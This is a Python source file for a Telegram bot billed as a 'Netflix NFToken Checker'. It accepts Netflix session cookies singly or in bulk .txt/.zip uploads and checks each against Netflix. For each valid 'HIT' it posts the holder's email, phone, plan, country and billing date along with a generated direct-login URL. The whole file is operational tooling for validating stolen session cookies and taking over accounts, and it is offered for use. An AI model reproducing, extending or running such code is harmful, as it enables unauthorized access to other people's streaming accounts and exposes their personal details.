import os
import telebot
import requests
import tempfile
import time
from datetime import datetime
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor
from checker import (
    extract_cookies, check_netflix_cookie, generate_token, 
    extract_zip_and_get_files, format_account_details, OWNER_CREDIT
)

# Load environment variables
load_dotenv()

# Configuration
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()

def print_banner():
    banner = f"""
    ╔════════════════════════════════════════════════════════╗
    ║                                                        ║
    ║   🎬  NETFLIX NFTOKEN CHECKER BOT (Optimized)          ║
    ║   👤  Owner: {OWNER_CREDIT:<33} ║
    ║                                                        ║
    ╚═════════╦════════════════════════════════════╦═════════╝
              ║  Status: Starting...               ║
              ╚════════════════════════════════════╝
    """
    print(banner)

def print_token_warning():
    warning = """
    ╔════════════════════════════════════════════════════════╗
    ║                                                        ║
    ║   ⚠️   CRITICAL WARNING: BOT TOKEN MISSING!             ║
    ║                                                        ║
    ╠════════════════════════════════════════════════════════╣
    ║                                                        ║
    ║   1. Open .env file in the bot folder                  ║
    ║   2. Add: TELEGRAM_BOT_TOKEN=your_token_here           ║
    ║   3. Get token from @BotFather                         ║
    ║                                                        ║
    ║   Without a valid token, the bot cannot start.         ║
    ║                                                        ║
    ╚════════════════════════════════════════════════════════╝
    """
    print(warning)

# Early validation
if not BOT_TOKEN or ":" not in BOT_TOKEN or "your_bot_token_here" in BOT_TOKEN:
    print_token_warning()
    exit(1)

# Initialize bot only if token is valid
try:
    bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=20)
    # Verify token by calling get_me()
    bot_info = bot.get_me()
    print(f"    ✅ Connected to Bot: @{bot_info.username}")
except Exception as e:
    print(f"\n❌ Error: Could not connect to Telegram.")
    print(f"Details: {e}")
    if "Unauthorized" in str(e):
        print("💡 Tip: Your Bot Token is likely incorrect. Get a new one from @BotFather.")
    exit(1)

# Helper function to process content
# ... rest of the helper functions ...
def process_cookie_content(content):
    cookies = extract_cookies(content)
    if not cookies or "NetflixId" not in cookies:
        return None, "❌ No valid NetflixId found in the provided content."
    
    # Check account validity
    account_info = check_netflix_cookie(cookies)
    
    if account_info["ok"]:
        token_result = generate_token(cookies["NetflixId"])
        return {
            "account_info": account_info,
            "token_result": token_result
        }, None
    else:
        return None, f"❌ Invalid account: {account_info.get('err', 'Unknown error')}"

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "🎬 *Netflix NFToken Checker Bot (Optimized)*\n\n"
        "Welcome! I can help you check Netflix cookies and generate login tokens.\n\n"
        "*Commands:*\n"
        "• `/chk <cookie_string>` - Check a single Netflix cookie\n"
        "• `/batch` - Upload a .txt or .zip file with multiple cookies\n\n"
        "*Supported formats:*\n"
        "• Netscape format (browser exports)\n"
        "• Raw cookie strings\n"
        "• JSON format\n\n"
        "*Required cookies:*\n"
        "• `NetflixId` (required)\n"
        "• `SecureNetflixId` (recommended)\n"
        "• `nfvdid` (recommended)\n\n"
        f"👤 *Owner:* `{OWNER_CREDIT}`"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['chk'])
def check_single(message):
    msg_parts = message.text.split(None, 1)
    if len(msg_parts) < 2:
        bot.reply_to(message, "❌ Please provide a cookie string after /chk\nExample: `/chk NetflixId=xxx;...`", parse_mode='Markdown')
        return
    
    content = msg_parts[1]
    status_msg = bot.reply_to(message, "⏳ Checking cookie, please wait...")
    
    result, error = process_cookie_content(content)
    
    if error:
        bot.edit_message_text(error, chat_id=status_msg.chat.id, message_id=status_msg.message_id)
    else:
        # Prepare response
        acc = result['account_info']
        token = result['token_result']
        
        response = (
            "🎬 *NETFLIX ACCOUNT HIT* ✅\n\n"
            "🌍 *Details:*\n"
            f"▫️ *Country:* `{acc['country']}`\n"
            f"▫️ *Plan:* `{acc['plan']}`\n"
            f"▫️ *Member Since:* `{acc['member_since']}`\n"
            f"▫️ *Billing Date:* `{acc['next_billing']}`\n"
            f"▫️ *Profiles:* `{acc['profiles']}`\n\n"
            "👤 *Profile:*\n"
            f"▫️ *Email:* `{acc['email']}`\n"
            f"▫️ *Phone:* `{acc['phone']}`\n\n"
        )
        
        if token['status'] == 'Success':
            response += (
                "🔑 *Token Information:*\n"
                f"▫️ *Direct Login:* [Click Here]({token['direct_login_url']})\n"
                f"▫️ *Expiry:* `{datetime.fromtimestamp(token['expires']).strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
                f"🔗 *URL:* `{token['direct_login_url']}`"
            )
        
        bot.edit_message_text(response, chat_id=status_msg.chat.id, message_id=status_msg.message_id, parse_mode='Markdown', disable_web_page_preview=True)
        
        # Also send the full text details
        full_details = format_account_details({**acc, 'token_result': token})
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
            f.write(full_details)
            temp_path = f.name
        
        with open(temp_path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📄 Complete account details")
        
        os.unlink(temp_path)

@bot.message_handler(commands=['batch'])
def batch_info(message):
    bot.reply_to(message, "📤 Please upload a `.txt` or `.zip` file containing Netflix cookies to start batch checking in parallel.", parse_mode='Markdown')

def check_file_task(txt_file, chat_id, filename_orig):
    """Worker function for ThreadPoolExecutor"""
    try:
        with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        result, error = process_cookie_content(content)
        if result:
            acc = result['account_info']
            token = result['token_result']
            fname = os.path.basename(txt_file)
            
            summary = (
                f"✅ *HIT:* `{fname}`\n"
                f"🌍 *Country:* `{acc['country']}` | *Plan:* `{acc['plan']}`\n"
                f"🔑 *URL:* `{token['direct_login_url']}`"
            )
            bot.send_message(chat_id, summary, parse_mode='Markdown', disable_web_page_preview=True)
            
            # Send full details as file
            full_details = format_account_details({**acc, 'token_result': token})
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
                f.write(full_details)
                temp_path = f.name
            
            with open(temp_path, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"📄 Details for `{fname}`")
            os.unlink(temp_path)
            return True
    except Exception as e:
        print(f"Error processing {txt_file}: {e}")
    return False

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    file_info = bot.get_file(message.document.file_id)
    filename = message.document.file_name.lower()
    
    if not (filename.endswith('.txt') or filename.endswith('.zip')):
        bot.reply_to(message, "❌ Please upload a `.txt` or `.zip` file.")
        return
    
    status_msg = bot.reply_to(message, f"⏳ Processing `{message.document.file_name}` in parallel threads...")
    
    downloaded_file = bot.download_file(file_info.file_path)
    temp_dir = tempfile.mkdtemp()
    file_path = os.path.join(temp_dir, message.document.file_name)
    
    with open(file_path, 'wb') as f:
        f.write(downloaded_file)
    
    txt_files = []
    if filename.endswith('.zip'):
        txt_files = extract_zip_and_get_files(file_path, temp_dir)
    else:
        txt_files = [file_path]

    if not txt_files:
        bot.edit_message_text("❌ No text files found to process.", chat_id=status_msg.chat.id, message_id=status_msg.message_id)
        import shutil
        shutil.rmtree(temp_dir)
        return

    # Process files in parallel
    found_any = False
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_file_task, tf, message.chat.id, message.document.file_name) for tf in txt_files]
        for future in futures:
            if future.result():
                found_any = True

    if not found_any:
        bot.edit_message_text("❌ No valid accounts found in the file.", 
                             chat_id=status_msg.chat.id, message_id=status_msg.message_id)
    else:
        bot.edit_message_text(f"✅ Finished processing `{message.document.file_name}`.", 
                             chat_id=status_msg.chat.id, message_id=status_msg.message_id)

    # Cleanup
    import shutil
    try:
        shutil.rmtree(temp_dir)
    except:
        pass

import signal
import sys

def signal_handler(sig, frame):
    print("\n    🛑 Stopping bot gracefully...")
    bot.stop_polling()
    print("    ✅ Bot stopped. Goodbye!")
    sys.exit(0)

if __name__ == "__main__":
    # Register the signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    print_banner()
    print(f"    🚀 Bot is online and running (Press Ctrl+C to stop)...")
    
    # Use infinity_polling with a small timeout for responsiveness
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        print(f"\n    [!] Unexpected Error: {e}")
